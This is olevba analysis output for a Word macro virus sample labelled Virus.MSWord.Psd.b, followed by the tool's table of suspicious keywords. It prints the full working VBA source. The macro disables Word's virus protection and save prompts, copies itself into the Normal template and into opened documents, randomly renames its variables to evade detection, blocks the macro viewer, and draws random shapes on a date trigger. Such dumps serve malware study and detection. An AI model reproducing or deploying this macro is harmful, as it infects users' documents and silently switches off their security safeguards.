olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-17c4a52d788a6dcdfdc2b86e47b3050cec5e894f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-17c4a52d788a6dcdfdc2b86e47b3050cec5e894f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For VB5517 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next VB5517: End If
MC6016 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
BJ3518 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TA8511 = ActiveDocument.VBProject.VBComponents.Item(1)
LA2383 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TA8511 = NormalTemplate.VBProject.VBComponents.Item(1)
TU9657 = True
Call IC6246_AN4363
ActiveDocument.Saved = True
End If
If TU9657 <> True And LA2383 <> True Then GoTo HH8035
If TU9657 = True Then TA8511.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, MC6016 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If LA2383 = True Then TA8511.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, BJ3518 - 4))
HH8035:
If BJ3518 <> 0 And MC6016 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function IC6246_AN4363()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "MU4730": r1(2) = "BT2524": r1(3) = "PA2551": r1(4) = "JN5369": r1(5) = "AN4363": r1(6) = "MC6016"
r1(7) = "BJ3518": r1(8) = "LA2383":: r1(9) = "TA8511": r1(10) = "TU9657": r1(11) = "HH8035": r1(12) = "IC6246": r1(13) = "NV5727": r1(14) = "KT7528": r1(15) = "VB5517"
For VB5517 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call AN4363(a1, r1(VB5517))
Next VB5517
End Function 'VAMP v1.0 [thanks Vic!]
Private Function AN4363(KT7528, NV5727 As String)
On Error Resume Next
Dim MU4730 As Long: Dim BT2524 As Long: Dim PA2551 As Long: Dim JN5369 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
MU4730 = 1: BT2524 = 1: PA2551 = .CountOfLines: JN5369 = Len(.Lines(.CountOfLines, 1))
Do While .Find(NV5727, MU4730, BT2524, PA2551, JN5369, True)
strline = .Lines(MU4730, 1)
strline = Left(strline, BT2524 - 1) & KT7528 & Mid(strline, JN5369)
.replaceline MU4730, strline
MU4730 = PA2551 + 1: BT2524 = 1:
PA2551 = .CountOfLines
JN5369 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

